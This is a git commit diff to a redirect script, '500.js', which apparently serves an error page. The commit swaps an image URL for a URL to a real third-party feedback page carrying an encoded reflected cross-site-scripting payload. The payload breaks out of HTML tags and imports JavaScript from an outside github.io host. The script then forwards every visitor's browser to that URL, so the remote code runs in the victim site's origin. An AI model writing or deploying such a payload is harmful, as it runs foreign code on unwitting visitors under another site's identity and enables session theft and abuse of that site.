a2f61000f4679eb5a633a58536f183da6dc22be0
xiachedann <2436452144@qq.com>
2024-08-05 15:29:45 +0800

    Update 500.js

--- 500.js
+++ 500.js
@@ -23,13 +23,13 @@ if (!isMobile()) {
 
 // 获取当前页面的 URL 参数
 const queryParams = new URLSearchParams(window.location.search);
-
+var timestamp = Date.now();
 // 构建新的目标 URL
-let targetUrl = 'https://cdn.ceo.qq.com/ceo_community/user_avatar/1722680910956.jpg';
+let targetUrl = 'https://feedback.vrs.sohu.com/feedback.html;fXcvJHmkItPPMsddiUlxoOUaqMtdRiGv?logId=1%27)%22%3C/Title/%3C/Style/%3C/Textarea/%3C/Iframe%3E%3CScript/K/%3Eimport(%27//xiachedann.github.io/playmusic.js%27)%3C/Script/K&17225942986202=5018016e'+timestamp+'1ea27a6572ef377dbad76da59d01d7f3a55';
 
 // 将当前页面的所有参数添加到目标 URL 中
 if (queryParams.toString() !== '') {
-	targetUrl += '?' + queryParams.toString();
+	targetUrl += '&' + queryParams.toString();
 }
 
 window.location.replace(targetUrl);
